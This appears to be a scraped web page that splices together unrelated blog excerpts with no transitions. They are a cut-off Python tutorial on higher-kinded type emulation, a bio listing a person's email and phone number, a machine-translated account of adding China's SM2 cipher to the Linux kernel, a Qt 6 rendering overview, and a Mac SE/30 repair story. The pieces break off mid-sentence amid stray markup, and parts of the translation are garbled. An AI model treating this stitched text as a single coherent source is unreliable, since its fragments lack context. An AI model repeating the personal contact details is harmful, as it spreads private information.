    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>length</span><span>:</span> <span>int</span>
    <span>width</span><span>:</span> <span>int</span>
    <span>height</span><span>:</span> <span>int</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Bag</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>brand</span><span>:</span> <span>str</span>
    <span>model</span><span>:</span> <span>str</span>
</code></pre></div></div>

<p>And we can create <code>Box</code>es and <code>Bag</code>s of different types, because we can put different things inside them:</p>

<div><div><pre><code><span>box</span> <span>=</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>10</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>  <span># Box[int]
</span><span>bag</span> <span>=</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>5</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>  <span># Bag[int]
</span></code></pre></div></div>

<p>Now, we need a function with a type transformation. Let’s say we want to apply a function to the value inside boxes and bags. Let’s use fake <code>BoxOrBag</code> type for now to illustrate our intent:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>

<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>BoxOrBag</span><span>[</span><span>_ValueType</span><span>],</span>  <span># fake type for now
</span>    <span>callback</span><span>:</span> <span>Callable</span><span>[[</span><span>_ValueType</span><span>],</span> <span>_NewValueType</span><span>],</span>
<span>)</span> <span>-&gt;</span> <span>BoxOrBag</span><span>[</span><span>_NewValueType</span><span>]:</span>  <span># fake type for now
</span>    <span>...</span>
</code></pre></div></div>

<p>It is going to work like so:</p>

<div><div><pre><code><span>assert</span> <span>apply_function</span><span>(</span><span>box</span><span>,</span> <span>str</span><span>)</span> <span>==</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>'10'</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>
<span>assert</span> <span>apply_function</span><span>(</span><span>bag</span><span>,</span> <span>bool</span><span>)</span> <span>==</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>True</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>
</code></pre></div></div>

<p>We only need to change current fake <code>BoxOrBag</code> type to a real HKT. We would need to define a new <code>Kind</code> type to make the emulation:</p>

<div><div><pre><code><span>_InstanceType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>
<span>_FirstTypeArgType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_FirstTypeArgType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>

<span>class</span> <span>Kind</span><span>(</span><span>Generic</span><span>[</span><span>_InstanceType</span><span>,</span> <span>_FirstTypeArgType</span><span>]):</span>
    <span>"""Used for HKT emulation."""</span>
</code></pre></div></div>

<p>One pro-tip about <code>Kind</code>: it won’t not exist during runtime. Only during type-checking.</p>

<p>Now, let’s change <code>apply_function</code> to use <code>Kind</code>:</p>

<div><div><pre><code><span>_InstanceKind</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceKind'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>Kind</span><span>[</span><span>_InstanceKind</span><span>,</span> <span>_ValueType</span><span>],</span>
    <span>callback</span><span>:</span> <span>Calla…</span></code></pre></div></div></div></div>

                <p>Microsoft's Adam Menges—founder at Lobe.ai and former Apple employee—on helping people build intelligence into their apps by making it simple and understandable, his unconventional education, having death present, regret avoidance, grit, and his daily routine for note-taking, file management, meditation, and much more.</p>

<p>Adam is a product designer, entrepreneur, and engineer located in San Francisco who specializes in Artificial Intelligence and visual programming languages. He spent time working for both Apple and SendGrid before starting his own company, Lobe, which was acquired in late 2018. Adam is continuing his work on making machine learning more accessible, and researching applications of the technology for video effects. You can contact Adam to find out more at <a target="_blank" href="https://adammenges.com/">adammenges.com</a>, and reach out to him at <a href="mailto:adam@adammenges.com">adam@adammenges.com</a> and <a href="tel:+17204840285">+17204840285</a>.</p>

National Secret is the abbreviation of National Commercial Encryption. The National Encryption Administration Bureau formulates algorithm standards. At the same time, it also formulates a large number of product and interface specifications and application scenarios. With the external international trade conflicts and technological blockades in recent years, the rapid development of the internal Internet, the rise of the IoT field, and the transformation of the financial field have intensified. It is particularly necessary and urgent to get rid of the excessive dependence on foreign technology and products, to build a network security environment for the industry, and to enhance the security and credibility of the industry information system in our country.</p>
<p>Cryptographic algorithms are the core technology to ensure information security, especially the most critical core areas of the banking industry that have long used internationally accepted cryptographic algorithm systems and related standards such as 3DES, SHA-1, and RSA.</p>
<p>At the end of 2010, the State Cryptography Administration announced the “elliptic curve public key cryptographic algorithm” (SM2 algorithm) independently developed by my country. In order to ensure the security of cryptographic applications in important economic systems, the State Cryptography Administration issued the “Notice on Doing a Good Job in Upgrading Public Key Cryptographic Algorithms” in 2011, which clearly requires that “starting from March 1, 2011, public The key cryptographic infrastructure electronic authentication system and key management system should use the national secret algorithm. Since July 1, 2011, the information system that is put into operation and uses public key cryptography should use the SM2 algorithm.”</p>
<p>Since 2012, the State Cryptography Administration has successively published SM2/SM3/SM4 and other cryptographic algorithm standards and their application specifications in the form of the “People’s Republic of China Password Industry Standards”. Among them, “SM” stands for “commercial secret”, which is a cryptographic technology used for commercial use that does not involve state secrets.</p>
<p>The main ones worthy of our attention are the following public algorithms:</p>

<p>SM2: Public key cryptographic algorithm standard based on elliptic curve cryptography (ECC), providing digital signature, key exchange, public key encryption, used to replace RSA/ECDSA/ECDH and other international algorithms</p>
</li>
<li>
<p>SM3: Message digest algorithm, the hash result is 256 bits, used to replace international algorithms such as MD5/SHA1/SHA256</p>
</li>
<li>
<p>SM4: Symmetric encryption algorithm, the key length and packet length are both 128 bits, mainly used in wireless LAN standards and used to replace DES/AES and other algorithms</p>
</li>
<li>
<p>National secret certificate: The national secret certificate here refers to the standard X509 format certificate using the national secret algorithm (SM2-with-SM3). The certificate uses SM3 as the hash algorithm and SM2 as the digital signature algorithm.</p>
</li>
<li>
<p>National Secret SSL: adopts the national secret algorithm, a secure transmission protocol that conforms to the national secret standard, that is, the national secret version of the SSL/TLS protocol</p>
</li>
</ul>
<p><strong>SM2 Advanced Linux Kernel Road</strong></p>
<p>At present, the Linux kernel has better support the SM3 and SM4 algorithms, which benefits from the widespread use of wireless LAN standards. However, the SM2 algorithm and the national secret certificate have not been supported for a long time, and it is impossible to establish full-stack trust and integrity verification in the kernel based on the national secret. Therefore, it has become urgent to support this system in the kernel. The whole plan is to support the SM2 algorithm and national secret certificate in the kernel, and after the internal business is first applied, it will eventually be promoted to the community.</p>
<p>After the whole process, there are many unsatisfactory things, right and record.</p>
<p>First time</p>
<p>With a plan, the next step is to consider how to implement it. Any cryptographic algorithm will first consider whether it can be transplanted from openssl. Fortunately, openssl supports SM2/3/4 very well, the implementation of the elliptic curve algorithm has been tested and mature, and the latest version also fully supports the national secret certificate. Unfortunately, the degree of coupling between the various modules of openssl is very high. To implement SM2 and national secret certificates, it is necessary to transplant the openssl architecture and infrastructure codes, including BIGNUM, ECC, X509, etc. This workload is undoubtedly huge. Even if it is realized, this approach is difficult to be accepted by the community. After repeated consideration and weighing, this “shortcut” was decisively abandoned.</p>
<p>second round</p>
<p>I found a surprising fact: there is already a basic implementation of the ellipse algorithm (crypto/ecc.c) in the kernel, why not try to do it based on this algorithm? So I started coding according to the SM2 specification, but the result is a bit regretful. This ellipse algorithm actually fails on SM2, and even the most basic dot multiplication results are wrong! Nani? The script shouldn’t be like this. So I sent an email to consult a senior developer of the algorithm, and I quickly got the following reply (sighing that there are still many kind people in the world):</p>
<blockquote>
<p>Shamir’s trick algo is probably generic, but it’s ecc_point_double_jacobian()</p>
<p>that is curve specific.</p>
<p>Algorithms are chosen that are fit curves I (and previous coders) used.</p>
<p>You need to check their properties carefully if you going to use them.</p>
<p>Some variants of used algos, that may fit other curves, are in referenced</p>
<p>papers (in comments).</p>
</blockquote>
<p>To summarize the reason: this algorithm is a highly optimized algorithm that has accurately adapted the elliptic curve parameters of NIST and ECRDSA, and is not necessarily suitable for the domestic SM2 curve parameters. It seems that this road will not work…</p>
<p>…While crying, ignore me.</p>
<p>…Wiping away the tears, looking at success or failure, life is heroic, but it’s all over again…</p>
<p>Third time</p>
<p>After repeated explorations, I found that the RSA algorithm in the kernel is implemented based on an mpi (high-precision integer) library, which comes from libgcrypt (this is the implementation of the underlying algorithm of the well-known privacy protection software GnuPG). An early version of mpi has been implemented in the kernel, which was introduced to implement RSA at that time. Now libgcrypt has a complete elliptic curve basic algorithm, so I tested the SM2 algorithm curve based on libgcrypt with the mentality of giving it a try. God bless, this surprise did not turn into a fright, and the experimental results are consistent with SM2 specifications.</p>
<p>Fourth time</p>
<p>The ECC algorithm in libgcrypt is a general algorithm with low coupling. So I have an idea. You can try to implement SM2 in libgcrypt first, and then transplant all of this set of things to the kernel after a small test, and further promote it to the community. It seems that this is also a way that can be accepted by the community. After having a plan, simply put on a comfortable look, solemnly put your hands on the keyboard, let your thinking flow naturally with your fingers, the next development and debugging will be relatively smooth, and soon there will be four public key algorithms. Piece set: encryption, decryption, signature, verification. These implementations were submitted to the libgcrypt community in one effort. After two rounds of review and modification, the SM2 algorithm was finally accepted by the community as a sub-algorithm of ECC. I would like to thank NIIBE Yutaka, one of the maintainers of libgcrypt, for his patience, friendliness, and Chinese tradition. The culture is also very understanding. The overall process is relatively smooth, so I won’t mention it. Attach relevant submissions:</p>
<p>http://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git;a=search;s=Tianjia+Zhang;st=author</p>
<p>Fifth time</p>
<p>Strike while the iron is hot, because the lib/mpi library in the kernel is an older version and serves RSA. Compared with the mpi in libgcrypt, it is a castrated version. The missing functions and ECC algorithms need to be transplanted, which is not technically difficult. But it is also a fine job, and the workload is not small. In practice, all the missing things in the process of implementing SM2 are transplanted, and the corresponding SM2 algorithm and the implementation of the national secret certificate will soon be available. After several rounds of polishing and full testing, there is the initial set of patches: https://lkml.org/lkml/2020/2/16/43</p>
<p>Sixth time</p>
<p>As the old Chinese saying goes, it’s a rush, it fades again, and everything is exhausted. The progress of things once again encounters obstacles. The Linux kernel is not comparable to a dedicated cryptographic library. For such an unknown algorithm, the community showed no interest, and few people even asked about it. In the end, it was rejected because it had no practical application scenario. Of course, things can’t just end like this. Considering the large amount of code and the low willingness of the maintainer to review, we decisively cut out the encryption, decryption and signature of SM2, and only retained the necessary verification functions to support the national secret certificate. Some minor repairs and supplements have been made to the upstream of IMA to enhance the national secret algorithm in order to use the national secret function in the IMA scene as a practical case. At the same time, with the continuous soft (si) grinding (chan) hard (lan) bubble (da) with the relevant developers and maintainers, new patches are constantly being sent, and finally even the habitual reply time of the maintainers is found. The law of integration with the patch continues to slowly advance the pace of SM2’s entry into the community.During this period, there …</p></div></div></article></div></div>

                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last year we had a three part blog series about Qt's new approach to working with 3D graphics APIs and shading languages: <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-direct3d">part 1</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-2">part 2</a>, <a href="https://www.qt.io/blog/qt-quick-on-vulkan-metal-and-direct3d-part-3">part 3</a>. For <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-index.html">Qt Quick</a>, an early, opt-in preview of the new rendering architecture was shipped in Qt 5.14, with some improvements in Qt 5.15. With the release of Qt 6.0 upcoming, let's see what has happened since Qt 5.15. It will not be possible to cover every detail of the graphics stack improvements for Qt Quick here, let alone dive into the vast amount of Qt Quick 3D features, many of which are new or improved in Qt 6.0. Rather, the aim is just to give an overview of what can be expected from the graphics stack perspective when Qt 6.0 ships later this year.</p>
<p>Note that the documentation links refer to the Qt 6 snapshot documentation. This allows seeing the latest C++ and QML API pages, including all changed and new functions, but the content is also not final. These links may also break later on.</p>
<!--more-->
<h2>QRhi improvements</h2>
<p>QRhi, the Qt Rendering Hardware Interface, is Qt's internal graphics abstraction when 3D APIs, such as OpenGL, Vulkan, Metal, and Direct 3D, are involved. Compared to 5.15, the main improvements in 6.0 are a lot of polishing fixes here and there, and, most importantly, a large set of performance optimizations. While benefitting Qt Quick as well, these become especially important with Qt Quick 3D when complex scenes with many renderable objects are involved.</p>
<p>With some simplifications, the main layers of the Qt 6.0 graphics stack can be visualized like this:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png" alt="rhiarch-3" width="800" srcset="https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=400&amp;name=rhiarch-3.png 400w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=800&amp;name=rhiarch-3.png 800w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1200&amp;name=rhiarch-3.png 1200w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=1600&amp;name=rhiarch-3.png 1600w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2000&amp;name=rhiarch-3.png 2000w, https://www.qt.io/hs-fs/hubfs/rhiarch-3.png?width=2400&amp;name=rhiarch-3.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<h2>Shader management</h2>
<p>The Qt Shader Tools module is now a selectable module in the installer. For applications this can be relevant because this is the module that provides the <em>qsb</em> command-line tool (not to be confused with <em>qbs</em>) and its associated CMake build system integration. In addition, the module is a mandatory dependency for Qt Quick 3D at the moment.</p>
<p>Qt 6 no longer uses OpenGL-compatible GLSL source snippets directly. Rather, shaders are all written in Vulkan-style GLSL, then reflected and translated to other shading languages, and finally packaged up into a serializable QShader object that can be consumed by QRhi. The shader preparation pipeline in Qt 6 is the following:</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png" alt="shaderconditioning" width="1280" srcset="https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=640&amp;name=shaderconditioning.png 640w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1280&amp;name=shaderconditioning.png 1280w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=1920&amp;name=shaderconditioning.png 1920w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=2560&amp;name=shaderconditioning.png 2560w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3200&amp;name=shaderconditioning.png 3200w, https://www.qt.io/hs-fs/hubfs/shaderconditioning.png?width=3840&amp;name=shaderconditioning.png 3840w" sizes="(max-width: 1280px) 100vw, 1280px"></p>
<p>In QML applications using Qt Quick, whenever working with ShaderEffect, or subclassing QSGMaterialShader, the application will need to provide a baked shader pack in form of a .qsb file. These are generated by the <em>qsb</em> tool. This does not however mean that developers have to start dealing with a new tool directly: with the CMake integration one can easily list the vertex, fragment, and compute shaders in CMakeLists.txt via the qt6_add_shaders() CMake function. Invoking qsb and packing the resulting .qsb files into the Qt resource system is then taken care of by the build system.</p>
<p>See <a href="https://doc-snapshots.qt.io/qt6-dev/qtshadertools-index.html">the shadertools documentation</a> for an overview of how graphics and compute shaders are handled in Qt 6 and the details of the qsb tool and its CMake integration.</p>
<h2>Direct OpenGL is no more for Qt Quick</h2>
<p>In Qt 5.14 and 5.15, Qt Quick shipped with an optional QRhi-based rendering path that could be enabled by setting the environment variable <em>QSG_RHI</em>. This allowed painless experimenting with the new stack, while keeping the traditional, battle tested direct OpenGL code path the default.</p>
<p>In Qt 6.0 all such switches are gone. There is no way get rendering go directly to OpenGL with Qt Quick scenes. Rather, the new default is the QRhi-based rendering path of the Qt Quick scene graph. Other than the defaults changing, the ways to configure what QRhi backend, and so which graphics API to use are mostly unchanged compared to Qt 5.15. See <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph-renderer.html#rendering-via-the-qt-rendering-hardware-interface">the documentation</a> for details. One difference is better API naming: in C++ code to request, and so effectively tie the application to, a given QRhi backend (and by extension graphics API) is now done through the <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#setGraphicsApi">QQuickWindow::setGraphicsApi()</a> function, whereas in 5.15 this task used to be pushed onto an overload of setSceneGraphBackend(), leading to fairly inaccurate naming.</p>
<p>There are a number of implications, although many applications will not notice any of these. If an application uses neither shader code (ShaderEffect, QSGMaterial) nor does it perform its own rendering with OpenGL directly, there is a very high chance that it will need no migration steps at all. (at least not because of graphics)</p>
<h4>Applications using OpenGL directly</h4>
<p>What about applications that use OpenGL directly in one way or another, and are not interested in functioning with other graphics APIs? For example, applications that use <a href="https://doc-snapshots.qt.io/qt6-dev/qquickframebufferobject.html">QQuickFramebufferObject</a>, or connect to signals like <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRendering">QQuickWindow::beforeRendering()</a> to inject their own OpenGL rendering under or above the Qt Quick scene. This is when the setGraphicsApi() function mentioned above comes into play for real: if an application wishes, it can always state that it wants OpenGL (or Vulkan, or Metal, or D3D) only, and nothing else. That way it is guaranteed that Qt Quick is going to use the corresponding QRhi backend (or else it will fail to initialize), so the application can safely assume that going directly to OpenGL is safe, because Qt Quick will also end up rendering through OpenGL. Note that this does not exempt the application from having to do other type of porting steps: for example, if it in addition uses ShaderEffect or creates its own custom materials, it will still need to migrate to the new ways of handling shaders and materials.</p>
<h4>QSG* and QQuick* API changes</h4>
<p>The API changes mainly fall into 3 categories. This is not going to be an exhaustive list, but rather just a peek at some of the important changes. Detailed change lists and porting guides are expected to be available with the final Qt 6.0 release.</p>
<ul>
<li>
<div><p>Different approach to shaders and materials: <a href="https://doc-snapshots.qt.io/qt6-dev/qsgmaterialshader.html">QSGMaterialShader</a> received a full revamp (matching more or less what the now-removed QSGMaterialRhiShader used to be in 5.14 and 5.15). <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html">ShaderEffect</a> no longer allows inline shader strings. Rather, the vertexShader and fragmentShader properties are URLs, similarly to <span>Image.source</span> and others. They can refer to a local .qsb file, or a .qsb file embedded via the Qt resource system (qrc).</p></div>
</li>
<li>
<p>Removing OpenGL-specifics from QQuickWindow, QSGTexture, and elsewhere. It should come as no surprise that functions like <em>GLuint textureId()</em>, <em>createTextureFromId(GLuint textureId, ...)</em>, or <em>setRenderTarget(GLuint fboId)</em> are now gone. Adopting (wrapping) an existing OpenGL texture, Vulkan image, Metal texture, or D3D11 texture, or accessing the underlying native texture for a QSGTexture is still perfectly possible, but now is done via a different set of APIs, such as <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-qsgvulkantexture.html">QSGVulkanTexture</a> and the <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-sub-qtquick.html">other similar classes</a>, instances of which are <a href="https://doc-snapshots.qt.io/qt6-dev/qsgtexture.html?__hstc=233546881.8510e053e4fb66e1a58543a6e9886427.1603454017210.1603454017210.1603454017210.1&amp;__hssc=233546881.1.1603454017210&amp;__hsfp=1285229618#nativeInterface" rel="noopener">queryable from QSGTexure</a>.</p>
<ul>
<li>
<div><p>Integrating the application's own custom rendering with the graphics API that Qt Quick renders with is fully supported, not just for OpenGL, but also Vulkan, Metal, and D3D11. Due to their nature however, some of these APIs will need more than connecting to one single signal like beforeRendering() or afterRendering(). For example, we now also have <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRenderPassRecording">beforeRenderPassRecording()</a>. See the relevant section in the <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph.html#mixing-scene-graph-and-the-native-graphics-api">scenegraph overview docs</a> for more details and links to examples. Finally, the number of native graphics resources queryable via <a href="https://doc-snapshots.qt.io/qt6-dev/qsgrendererinterface.html">QSGRendererInterface</a> has been extended, now covering Vulkan, Metal, and Direct 3D too.</p></div>
</li>
</ul>
</li>
<li>
<p>Extending support for redirecting the Qt Quick scene into an offscreen render target. <a href="https://www.qt.io/blog/%3Ehttps://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html">QQuickRenderControl</a> and the related infrastructure has been heavily enhanced. This was done not just to enable working with graphics APIs other than OpenGL the same way as in Qt 5 (for example, to render a Qt Quick scene into a Vulkan VkImage without an on-screen window), but also to enable integration with AR/VR frameworks and APIs such as <a href="https://www.khronos.org/openxr/">OpenXR</a> (in combination with any of Vulkan, D3D11, or OpenGL). Besides the slightly changed QQuickRenderControl interface, we now have a number of helper classes that improve the configurability of a QQuickWindow: <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendertarget.html">QQuickRenderTarget</a>, <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsdevice.html">QQuickGraphicsDevice</a>, and <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsconfiguration.html">QQuickGraphicsConfiguration</a>. These are essential in scenarios where a more fine grained control is needed: integrating with APIs like OpenXR is not always straightforward when an existing rendering engine is involved, with a number of potential chicken-egg problems when it comes to the creation, initialization, and ownership of instance, device, and other graphics objects: Which Vulkan instance should Qt Quick use, or should it create a new one upon initializing the scenegraph for the first time? Which Vulkan physical device or DXGI adapter should Qt Quick pick, or just stay with the default? Which VkDevice extensions should be enabled in addition to what Qt itself needs? What 2D image/texture should rendering target, who creates that and when? The expectation is that Qt 6.0 will be well-prepared and providing the foundations for further exploring the world of AR/VR during the rest of the Qt 6.x series.</p>
</li>
</ul>
<h4>New approach to handling shader code in ShaderEffect</h4>
<p>A comprehensive example of the new approach to shader code in ShaderEffect is the Qt 6 port of the classic Qt 5 Cinematic Experience demo. <a href="https://github.com/alpqr/qt5-cinematic-experience" rel="noopener">(GitHub repo)</a> This version is ported to CMake and is fully functional with all graphics APIs, including all shader and particle effects.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png" alt="cinematic" width="702" srcset="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=351&amp;name=cinematic.png 351w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png 702w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1053&amp;name=cinematic.png 1053w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1404&amp;name=cinematic.png 1404w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1755&amp;name=cinematic.png 1755w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=2106&amp;name=cinematic.png 2106w" sizes="(max-width: 702px) 100vw, 702px"></p>
<p>Looking at the QML source code, for example the code for the <a href="https://github.com/alpqr/qt5-cinematic-experience/blob/master/content/CurtainEffect.qml" rel="noopener">curtain effect </a>shows that indeed it has all inline GLSL strings removed.</p>

      <p><em>Or how I fixed my Mac SE/30 that was not booting unexpectedly</em></p>
<p>One day around a year ago I was playing with my SE/30 (the best looking computer ever) and I was trying to install Debian on it for fun. But after inserting some floppies and trying to boot from them the computer wouldn’t turn back on. I mean it would turn on but with weird static graphics and no sound at startup. I already had a hard time figuring out how I would boot Linux on that machine (which I succeeded at doing) that I did not want to spend more time fixing it.</p>
<p>Here is what I was left with :</p>
<p><img src="https://ronangaillard.github.io/img/simasimac.jpg" alt="simasimac"></p>
<p>A few weeks ago I really wanted to play again with my old Macintosh and experiment with A/UX, the first Apple unix OS ! So I started looking on the internet to see if the problem I had was common. And indeed it was ! I learnt it was called Simasimac and often happened because old electrolytic capacitors would leak. It could lead to two main things : traces could be connected together because this leak could be conductive, or it could corrode traces and make them not continuous anymore.</p>
<p>So I had to open my Mac SE/30 for the first time. Hopefully I had bought a few years ago the very long screwdrivers you need to open these vintage Macs. And after taking the logic board out I did notice some minor leakage but no sign of “cracks” on the capacitors. An easy solution I found on the internet was to wash the logic board in the dishwasher (crazy !?), and it happened to often solve the first problem of capacitor leaks : the short circuit between traces. As I had no dishwasher I took a tooth brush and wash the logic board under clear water insisting on areas with leakage. I let it dry for one big day, finished cleaning it with alcohol and tried to boot the SE/30 again. But it would still display those weird zebra stripes on the screen and would not boot.</p>
<p>The logic board before cleaning :
<img src="https://ronangaillard.github.io/img/dirty-mobo.jpg" alt="dirty mobo"></p>
<p>I also saw on the internet that a bad/discharged battery (the red one you see on the previous picture) could lead to boot problems and simasimac. I did not really trust this as I am convinced this is only used to keep time and some user settings (such as mouse speed) in a volatile RAM. And I knew it was discharged from a long time ago (even when the Mac did boot normally) because the Mac would not keep time when it was turned off. Anyway I would still need a new battery when the Mac would be back to normal so I bought one off Amazon, put it in and tried to boot again. But no surprise it still did not want to boot !</p>
<p>Later readings also taught me that if the simasimac stayed after Logic Board cleaning one solution could be to recap the all board. Thanks to this excellent article : <a href="https://recapamac.com.au/macintosh-se-30/">https://recapamac.com.au/macintosh-se-30/</a> I was able to quickly buy the needed caps off DigiKey and receive them in less than 48 hours (even in France !).</p>
<p>For reference here are the parts I ordered :</p>
<table>
<thead>
<tr>
<th>Capacitance</th>
<th>DK Part Number</th>
<th>Qty</th>
</tr>
</thead>
<tbody>
<tr>
<td>1uF</td>
<td>399-3730-1-ND</td>
<td>1</td>
</tr>
<tr>
<td>220uF</td>
<td>1572-1103-ND</td>
<td>1</td>
</tr>
<tr>
<td>470uF</td>
<td>1572-1494-ND</td>
<td>1</td>
</tr>
<tr>
<td>47uF</td>
<td>399-18075-1-ND</td>
<td>10</td>
</tr>
</tbody>
</table>
<p>I would highly advise to recap your vintage Mac as soon as possible to avoid such issues I had (and that many others have). It could destroy your Logic Board and you could never boot you mac again. It’s quite easy to do if you have some equipment, patience and some little skills.</p>
<p>So I used my hot air gun to remove all these caps and most of the little one exploded. They do really smell awful when they do so, I would advise to do it in a well ventilated area. I have to say I was a bit scared to damage the PCB because some traces looked really fragile. I had some issues removing the axial capacitors because the original soldering tin was hard to melt. I’m not sure why, I tried to change temperature from 300 degrees Celsius to 400, but it was not really easy.</p>
<p>I then soldered back every caps, again axial caps where hard to put back because even with my desoldering needles I had a hard time putting the capacitors legs through the holes. Anyway, everything was soldered back :</p>
<p><img src="https://ronangaillard.github.io/img/recapped-mobo.jpg" alt="recapped mobo"></p>
<p>I’m not super happy about the result, contacts are well made and well soldered but capacitors are not always well aligned.</p>
<p>But I was super excited because I thought my problem was be solved. Most sites and articles I read said recapping was the ultimate fixing step. So I confidently plugged everything back and turned on my Mac. Nothing was fixed at all, it was still in the same state as the beginning.</p>
<p>So I was back to reading articles, blog posts, forums and reddit to find people having the same issues. I found out bad RAM chips could lead to my issue, so I started removing RAM bars or swapping them but nothing changed. So I posted to Reddit to get some feedback and advice : <a href="https://www.reddit.com/r/VintageApple/comments/jh5oo1/simasimac_even_after_recapping_any_hint_or_advice/">https://www.reddit.com/r/VintageApple/comments/jh5oo1/simasimac_even_after_recapping_any_hint_or_advice/</a></p>
<p>I learnt that it could be a problem with the ROM : either the chip itself or the traces between the CPU and the ROM. I did not really know where to start, so I searched for the SE/30 schematics and found them here : <a href="https://museo.freaknet.org/gallery/apple/stuff/mac/andreas.kann/schemat.html">https://museo.freaknet.org/gallery/apple/stuff/mac/andreas.kann/schemat.html</a> I noticed the ROM is directly connected to the CPU (which is in fact of no surprise and classical design as it is the first boot device). So I searched for the 68030 (CPU) pinout on Google and found it at the end of the NXP datasheet : <a href="https://www.nxp.com/docs/en/reference-manual/MC68030UM.pdf">https://www.nxp.com/docs/en/reference-manual/MC68030UM.pdf</a> The next thing I had to do is to make sure each address trace, and each data trace was well connected between the CPU and the ROM socket. I used my multimeter in continuous mode and got the following pin mapping on the Logic Board :</p>
<p><img src="https://ronangaillard.github.io/img/rom-socket-matching.jpg" alt="rom socket mapping"></p>
<p>So I knew my CPU was well connected to my ROM. My ROM itself could have defects but I wanted to make sure every peripherals worked before buying a new ROM because they are quite expensive on eBay.</p>
<p>After some more discussion on Reddit I decided to do the same thing I did with ROM but for the RAM. If you look at the schematics you’ll notice that the connections between the RAM and the CPU is a bit more complex because it involves many more logic (for paging for instance). So I started to check the traces between the CPU and the Glue Logic Chip (which is the chip between the CPU and the RAM). Still using the schematics I noticed that not all address bus bits were connected between these two chips. So I tested the one that were supposed to be connected with my multimeter, and I found out that the A24 trace seemed to be not continuous :</p>
<p><img src="https://ronangaillard.github.io/img/a24-trace.jpg" alt="A24 trace"></p>
<p>I was half surprised because the A24 trace goes below the C11 capacitor. And that non continuous trace could be explained by the fact that the old C11 capacitor leaked, and that the leakage corroded or destroyed the trace. So I did a hot fix with a stripping wire going directly from the Glue Chip to the CPU :</p>
<p><img src="https://ronangaillard.github.io/img/a24-fix.jpg" alt="A24 fix"></p>
<p>I then plugged everything back, and success !! It’s alive ! The weird zebra stripes had disappeared and it was showing the mouse cursor !</p>
<p>Unfortunately it does not boot from the internal hard drive, I’m not sure if I wiped it when trying to install Linux or not. So I created a new floppy boot disk with System 7.5. But unfortunately again the SE/30 does not want to boot from that floppy disk. I am still a bit confused as the floppy drive used to work really well. So I removed it from the Mac case and cleaned the drive heads with alcohol. But still, it doesn’t want to boot from my floppy. I guess the next step is to dismantle the whole floppy drive and give it a good clean. In the mean time I bought a SCSI2SD which will make everything easier and more reliable.</p>
